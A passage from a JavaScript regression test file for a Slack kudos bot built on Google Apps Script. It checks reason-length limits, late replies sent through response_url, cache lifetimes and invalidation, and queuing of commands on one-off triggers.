  assert(row > 0, 'ALLOWANCE_PEER should be on the Config tab');

  cfg.getRange(row + 1, 3, 1, 1).setValues([['Orange dots each non-manager gets per period.']]);
  const out = env.call('refreshConfigNotes');

  const after = cfg.getDataRange().getValues()[row];
  eq(String(after[2]).indexOf('Orange'), -1, `stale note should be gone, got: ${after[2]}`);
  eq(env.call('num_', after[1]), 7, 'the value must survive a notes refresh');
  assert(/Refreshed \d+ config note/.test(out), `unexpected summary: ${out}`);
});


test('REG-19 the reason minimum lets a short real reason through', () => {
  const env = freshEnv();
  eq(env.call('cfgNum', 'MIN_REASON_CHARS'), 6, 'the floor is six characters');

  // The two that were refused in real use on 19 Sep.
  ['doggos!', 'good idea'].forEach((reason) => {
    const b = body(slashCommand(env, '/wag', `<@U08SAM01> ${reason}`));
    eq(b.text.indexOf('Add a reason'), -1, `"${reason}" should be accepted, got: ${b.text}`);
  });

  // Still refuses the ones that say nothing.
  const b = body(slashCommand(env, '/wag', '<@U08DANA1> ty'));
  includes(b.text, 'Add a reason');
});

test('REG-20 a give makes one parallel round trip to Slack, not two', () => {
  // The live shape: announcements are centralized in #kudos, the giver gets a
  // private receipt back on the HTTP response.
  const env = freshEnv({ ANNOUNCE_IN_SOURCE_CHANNEL: false });
  env.clearFetches();
  slashCommand(env, '/wag', '<@U08SAM01> covered two sessions at no notice on Tuesday');

  const posts = env.state.fetches.filter((f) => f.method === 'chat.postMessage');
  const announce = posts.filter((f) => f.payload.channel === 'C_KUDOS');
  eq(announce.length, 1, 'the announcement goes to #kudos exactly once');

  // Every Slack write in the give path belongs to one fetchAll batch. The fake
  // records the requests in order, so a second serial post would show up as a
  // chat.postMessage after a non-Slack call or on its own.
  const batchIds = new Set(env.state.fetches.filter((f) => f.method.indexOf('chat.') === 0).map((f) => f.batchId));
  eq(batchIds.size, 1, `all chat.* calls should share one batch, saw ${batchIds.size}`);
});

test('REG-21 an answer past the deadline goes to response_url and the body comes back empty', () => {
  // RESPONSE_DEADLINE_MS 0 means "our share of the budget is already gone",
  // which is what a slow spreadsheet open looks like in production.
  // The inline road: the one taken when ASYNC_COMMANDS is off, or when a burst
  // means a command could not be parked for a trigger.
  const env = freshEnv({ RESPONSE_DEADLINE_MS: 0, ASYNC_COMMANDS: false });
  env.clearFetches();

  const out = env.call('doPost', {
    parameter: {
      k: 'secret123',
      command: '/wag', text: '<@U08SAM01> covered two sessions at no notice on Tuesday',
      user_id: 'U08JOSH1', user_name: 'josh',
      channel_id: 'C_GENERAL', channel_name: 'general',
      team_id: 'T_TEST', response_url: 'https://hooks.slack.test/r'
    },
    postData: { type: 'application/x-www-form-urlencoded', contents: '' }
  });

  eq(out.getContent(), '', 'Slack has stopped listening; hand back nothing');

  const late = env.state.fetches.filter((f) => String(f.url).indexOf('hooks.slack.test') !== -1);
  eq(late.length, 1, 'the answer should have been posted to response_url');
  const delivered = JSON.parse(late[0].params.payload);
  includes(JSON.stringify(delivered), 'tailwag');

  // And it is counted exactly once, not once per delivery route.
  const ledger = env.state.spreadsheet.getSheetByName('Ledger').getDataRange().getValues();
  eq(ledger.length - 1, 1, 'one ledger row');
});

test('REG-22 a refusal past the deadline reaches the user too', () => {
  // The 19 Sep failure: "/wag @lindsey doggos!" was refused for a short reason,
  // the refusal was fast, so it rode the HTTP response — and Slack had already
  // given up. The user saw operation_timeout and no explanation at all.
  const env = freshEnv({ RESPONSE_DEADLINE_MS: 0, MIN_REASON_CHARS: 12, ASYNC_COMMANDS: false });
  env.clearFetches();

  const out = env.call('doPost', {
    parameter: {
      k: 'secret123',
      command: '/wag', text: '<@U08SAM01> doggos!',
      user_id: 'U08JOSH1', user_name: 'josh',
      channel_id: 'C_GENERAL', channel_name: 'general',
      team_id: 'T_TEST', response_url: 'https://hooks.slack.test/r'
    },
    postData: { type: 'application/x-www-form-urlencoded', contents: '' }
  });

  eq(out.getContent(), '');
  const late = env.state.fetches.filter((f) => String(f.url).indexOf('hooks.slack.test') !== -1);
  eq(late.length, 1, 'the refusal has to reach the user, not vanish');
  const delivered = JSON.parse(late[0].params.payload);
  eq(delivered.response_type, 'ephemeral');
  includes(delivered.text, 'Add a reason');
});

test('REG-23 config is read from the sheet once and then served from cache', () => {
  const env = freshEnv();
  env.run("var __cfgReads = 0; var __realReadSheet = readSheet_;"
    + " readSheet_ = function (n) { if (n === 'Config') __cfgReads++; return __realReadSheet(n); };"
    + " cacheDrop_('config'); __configCache = null;");

  env.call('getConfigAll');
  env.run('__configCache = null;');   // a second execution, same cache
  env.call('getConfigAll');
  eq(env.run('__cfgReads'), 1, 'the Config tab should be opened once, not once per execution');

  assert(env.call('cfgNum', 'RESPONSE_DEADLINE_MS') > 0, 'the deadline has a value');
  assert(env.state.cache['od.v1.config'] !== undefined, 'config should be cached');

  // Six hours, the platform maximum. Every writer drops the entry, so the only
  // thing a short TTL bought was a cold spreadsheet read on almost every
  // command — out of the same three seconds Slack was counting.
  eq(env.run('CACHE_TTL.CONFIG'), 21600);
});


test('REG-24 editing the Config tab by hand drops the cached copy', () => {
  const env = freshEnv();
  env.call('getConfigAll');
  assert(env.state.cache['od.v1.config'] !== undefined, 'config starts cached');

  // An edit somewhere else leaves it alone.
  env.call('onConfigEdit', { range: { getSheet: () => ({ getName: () => 'Ledger' }) } });
  assert(env.state.cache['od.v1.config'] !== undefined, 'a Ledger edit is none of our business');

  // An edit on Config drops it, so the next command reads the new value.
  env.call('onConfigEdit', { range: { getSheet: () => ({ getName: () => 'Config' }) } });
  eq(env.state.cache['od.v1.config'], undefined, 'a Config edit must drop the cache');

  // And it can never break an edit, whatever it is handed.
  env.call('onConfigEdit', null);
  env.call('onConfigEdit', {});
});


test('REG-25 the caches a command reads all outlive the gaps between commands', () => {
  const env = freshEnv();
  // Anything a slash command reads on the way to an answer. Ten minutes was
  // shorter than the gap between two tailwags on a normal day, so every command
  // was paying for a cold read out of Slack's three-second budget.
  ['CONFIG', 'ROSTER', 'HEADER', 'BALANCE_INDEX', 'LEADERBOARD', 'STATS'].forEach((k) => {
    eq(env.run(`CACHE_TTL.${k}`), 21600, `${k} should live the full six hours`);
  });
});

test('REG-26 warmCaches fills what the command paths read, and only reads', () => {
  const env = freshEnv();
  env.run("cacheDropAll_(); __configCache = null;");
  eq(env.state.cache['od.v1.roster'], undefined, 'starting cold');

  const ledgerBefore = env.state.spreadsheet.getSheetByName('Ledger').getDataRange().getValues().length;
  const out = env.call('warmCaches');

  ['config', 'roster', 'balances.index', 'stats'].forEach((k) => {
    assert(env.state.cache['od.v1.' + k] !== undefined, `${k} should be warm afterwards`);
  });
  assert(/Warmed .*config/.test(out), `unexpected summary: ${out}`);

  const ledgerAfter = env.state.spreadsheet.getSheetByName('Ledger').getDataRange().getValues().length;
  eq(ledgerAfter, ledgerBefore, 'warming must not write anything');
});

test('REG-27 a hand edit drops what that tab feeds, and nothing else', () => {
  const env = freshEnv();
  const fill = () => env.run("getConfigAll(); getRoster_(); balanceIndex_(); globalStats_();");
  const edit = (tab) => env.call('onConfigEdit', { range: { getSheet: () => ({ getName: () => tab }) } });

  fill();
  edit('Roster');
  eq(env.state.cache['od.v1.roster'], undefined, 'a Roster edit drops the roster');
  assert(env.state.cache['od.v1.config'] !== undefined, 'and leaves the config alone');

  env.run('__configCache = null;'); fill();
  edit('Ledger');
  eq(env.state.cache['od.v1.balances.index'], undefined, 'a Ledger edit drops the balance index');
  eq(env.state.cache['od.v1.stats'], undefined, 'and the stats');
  assert(env.state.cache['od.v1.config'] !== undefined, 'and still leaves the config alone');
});

test('REG-28 a warm interval the platform will not accept snaps to one it will', () => {
  const env = freshEnv();
  // everyMinutes() throws on anything but these, which would break the install.
  [[1, 1], [4, 5], [7, 5], [12, 10], [13, 15], [22, 15], [40, 30], [0, 15], ['', 15]]
    .forEach(([given, want]) => eq(env.call('nearestMinuteInterval_', given), want, `for ${given}`));
});


test('REG-30 a slash command is parked for a trigger and Slack gets an empty body', () => {
  const env = freshEnv({ ASYNC_COMMANDS: true });
  env.clearFetches();

  const out = env.call('doPost', {
    parameter: {
      k: 'secret123',
      command: '/wag', text: '<@U08SAM01> covered two sessions at no notice on Tuesday',
      user_id: 'U08JOSH1', user_name: 'josh',
      channel_id: 'C_GENERAL', channel_name: 'general',
      team_id: 'T_TEST', response_url: 'https://hooks.slack.test/r'
    },
    postData: { type: 'application/x-www-form-urlencoded', contents: '' }
  });

  eq(out.getContent(), '', 'Slack is told nothing, which it shows as nothing');
  eq(env.state.fetches.length, 0, 'no Slack calls on the request path at all');
  eq(env.state.spreadsheet.getSheetByName('Ledger').getDataRange().getValues().length - 1, 0,
    'and nothing is counted yet');

  const queued = env.run('ScriptApp.getProjectTriggers()')
    .filter((t) => t.getHandlerFunction() === 'runQueuedCommand');
  eq(queued.length, 1, 'exactly one job is waiting');
});

test('REG-31 the parked command runs, counts once, and answers on response_url', () => {
  const env = freshEnv({ ASYNC_COMMANDS: true });
  env.clearFetches();
  env.call('doPost', {
    parameter: {
      k: 'secret123',
      command: '/wag', text: '<@U08SAM01> covered two sessions at no notice on Tuesday',
      user_id: 'U08JOSH1', user_name: 'josh',
      channel_id: 'C_GENERAL', channel_name: 'general',
      team_id: 'T_TEST', response_url: 'https://hooks.slack.test/r'
    },
    postData: { type: 'application/x-www-form-urlencoded', contents: '' }
  });

  const uid = env.run('ScriptApp.getProjectTriggers()')
    .filter((t) => t.getHandlerFunction() === 'runQueuedCommand')[0].getUniqueId();
  env.call('runQueuedCommand', { triggerUid: uid });

  eq(env.state.spreadsheet.getSheetByName('Ledger').getDataRange().getValues().length - 1, 1,
    'counted exactly once');

  const late = env.state.fetches.filter((f) => String(f.url).indexOf('hooks.slack.test') !== -1);
  eq(late.length, 1, 'the answer goes to response_url');
  includes(JSON.parse(late[0].params.payload).text, 'tailwag');

  eq(env.run('ScriptApp.getProjectTriggers()')
    .filter((t) => t.getHandlerFunction() === 'runQueuedCommand').length, 0,
    'the one-off trigger cleans itself up');
  const leftover = Object.keys(env.state.properties).filter((k) => k.indexOf('TW_JOB_') === 0);
  eq(leftover.length, 0, `no leftover job properties, saw ${leftover}`);
});

test('REG-32 a refusal takes the same road, and still refuses', () => {
  const env = freshEnv({ ASYNC_COMMANDS: true });
  env.clearFetches();
  env.call('doPost', {
    parameter: {
      k: 'secret123', command: '/wag', text: '<@U08SAM01> ty',
      user_id: 'U08JOSH1', user_name: 'josh',
      channel_id: 'C_GENERAL', channel_name: 'general',
      team_id: 'T_TEST', response_url: 'https://hooks.slack.test/r'
    },
    postData: { type: 'application/x-www-form-urlencoded', contents: '' }
  });
  const uid = env.run('ScriptApp.getProjectTriggers()')
    .filter((t) => t.getHandlerFunction() === 'runQueuedCommand')[0].getUniqueId();
  env.call('runQueuedCommand', { triggerUid: uid });

  const late = env.state.fetches.filter((f) => String(f.url).indexOf('hooks.slack.test') !== -1);
  eq(late.length, 1, 'the refusal reaches the user rather than vanishing');
  includes(JSON.parse(late[0].params.payload).text, 'Add a reason');
});

test('REG-33 when a command cannot be parked it is answered inline instead', () => {
  const env = freshEnv({ ASYNC_COMMANDS: true });
  // What a burst past the per-script trigger ceiling looks like.
  env.run("ScriptApp.newTrigger = function () { throw new Error('too many triggers'); };");
  env.clearFetches();

  const out = env.call('doPost', {
    parameter: {
      k: 'secret123',
      command: '/wag', text: '<@U08SAM01> covered two sessions at no notice on Tuesday',
      user_id: 'U08JOSH1', user_name: 'josh',
      channel_id: 'C_GENERAL', channel_name: 'general',
      team_id: 'T_TEST', response_url: 'https://hooks.slack.test/r'
    },
    postData: { type: 'application/x-www-form-urlencoded', contents: '' }
  });

  assert(out.getContent().length > 0, 'the answer comes back on the response, late or not');
  eq(env.state.spreadsheet.getSheetByName('Ledger').getDataRange().getValues().length - 1, 1,
    'and it still counted, exactly once');
});

test('REG-34 switching it off restores the inline answer', () => {
  const env = freshEnv({ ASYNC_COMMANDS: false });
  const b = body(env.call('doPost', {
    parameter: {
      k: 'secret123',
      command: '/wag', text: '<@U08SAM01> covered two sessions at no notice on Tuesday',
      user_id: 'U08JOSH1', user_name: 'josh',
      channel_id: 'C_GENERAL', channel_name: 'general',
      team_id: 'T_TEST', response_url: 'https://hooks.slack.test/r'
    },
    postData: { type: 'application/x-www-form-urlencoded', contents: '' }
  }));
  includes(JSON.stringify(b), 'tailwag');
  eq(env.run('ScriptApp.getProjectTriggers()')
    .filter((t) => t.getHandlerFunction() === 'runQueuedCommand').length, 0);
});

test('REG-35 a job that never ran is swept, so the trigger ceiling cannot fill up', () => {
  const env = freshEnv({ ASYNC_COMMANDS: true });
  const send = () => env.call('doPost', {
    parameter: {
      k: 'secret123', command: '/wags', text: '',
      user_id: 'U08JOSH1', user_name: 'josh',
      channel_id: 'C_GENERAL', channel_name: 'general',
      team_id: 'T_TEST', response_url: 'https://hooks.slack.test/r'
    },
    postData: { type: 'application/x-www-form-urlencoded', contents: '' }
  });
  send(); send();
  eq(env.run('ScriptApp.getProjectTriggers()')
    .filter((t) => t.getHandlerFunction() === 'runQueuedCommand').length, 2);

  // Both jobs aged out of the cache without their triggers ever firing.
  Object.keys(env.state.cache)
    .filter((k) => k.indexOf('od.v1.job.') === 0)
    .forEach((k) => { delete env.state.cache[k]; });

  eq(env.call('sweepQueuedCommands_'), 2, 'both dead triggers removed');
  eq(env.run('ScriptApp.getProjectTriggers()')
    .filter((t) => t.getHandlerFunction() === 'runQueuedCommand').length, 0);
  eq(Object.keys(env.state.properties).filter((k) => k.indexOf('TW_JOB_') === 0).length, 0,
    'and their properties with them');
});

test('REG-36 the sweep leaves a job that is still waiting alone', () => {
  const env = freshEnv({ ASYNC_COMMANDS: true });
  env.call('doPost', {
    parameter: {
      k: 'secret123', command: '/wags', text: '',
      user_id: 'U08JOSH1', user_name: 'josh',
      channel_id: 'C_GENERAL', channel_name: 'general',
      team_id: 'T_TEST', response_url: 'https://hooks.slack.test/r'
    },
    postData: { type: 'application/x-www-form-urlencoded', contents: '' }
  });
  eq(env.call('sweepQueuedCommands_'), 0, 'nothing to sweep');
  eq(env.run('ScriptApp.getProjectTriggers()')
    .filter((t) => t.getHandlerFunction() === 'runQueuedCommand').length, 1);
});

// ===========================================================================

console.log(`\n${'─'.repeat(60)}`);
if (failed === 0) {
  console.log(`\x1b[32m\x1b[1m${passed} passed\x1b[0m, 0 failed`);
} else {
  console.log(`\x1b[32m${passed} passed\x1b[0m, \x1b[31m\x1b[1m${failed} failed\x1b[0m\n`);
  failures.forEach((f) => {
    console.log(`\x1b[31m${f.suite} › ${f.name}\x1b[0m`);
    console.log(`  ${f.error.stack.split('\n').slice(0, 4).join('\n  ')}\n`);
  });
}
process.exit(failed === 0 ? 0 : 1);
